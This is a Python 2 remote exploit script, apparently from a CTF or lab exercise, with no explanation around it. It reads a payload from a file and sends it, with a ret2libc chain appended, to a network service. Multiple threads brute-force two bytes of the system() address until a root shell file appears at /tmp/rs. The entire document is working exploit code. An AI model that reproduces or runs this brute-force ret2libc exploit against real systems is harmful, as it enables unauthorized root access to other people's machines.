# t0 - 2024
from threading import Thread
import thread
from Queue import Queue
import socket
import sys
import os

concurrent = 20
global target
global port
fp=open("payload.txt", "r")
filepayload = fp.readline()

def sendRequest(target, port, payload):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
				s.connect((target, port))
				done = False
				while done == False:
					response=s.recv(1024)
					if ">" in response:
						s.send(payload)
						result = ""
						result =  s.recv(1024)
						result = result.strip() +  s.recv(1024)
						result = result.strip()
						s.close()
						return result
	except Exception, err:
				print Exception, err

def getMoney():
	while True:
		system_addr=q.get()
		ownage(system_addr)
	q.task_done()

def ownage(_system):
			print "[+] Trying address " + _system[0].encode("hex")
			tmplog = "\x60\x8c\x04\x08" #0x08048c60
			ret2libc = _system[0] + "JUNK" + tmplog		
			payload = filepayload + ret2libc
			sendRequest(target, port, payload)
			if os.path.isfile("/tmp/rs"):
				print "[!] Root shell created, run /tmp/rs ;)"
				thread.interrupt_main()

if len(sys.argv) < 2:
	print "[-] usage: python get_canary.py [ip] [port]"
	exit(0)
else:
	target = sys.argv[1]
	port = int(sys.argv[2])
	q=Queue(concurrent*2)
	for i in range(concurrent):
		t=Thread(target=getMoney)
		t.daemon=True
		t.start()
	try:
		for addr_byte1 in xrange(256):
			for addr_byte2 in xrange(256):
				_system = chr(addr_byte1) + chr(addr_byte2) + "\x16\x00"
				q.put([_system])
		q.join()
	except KeyboardInterrupt:

		exit(1)
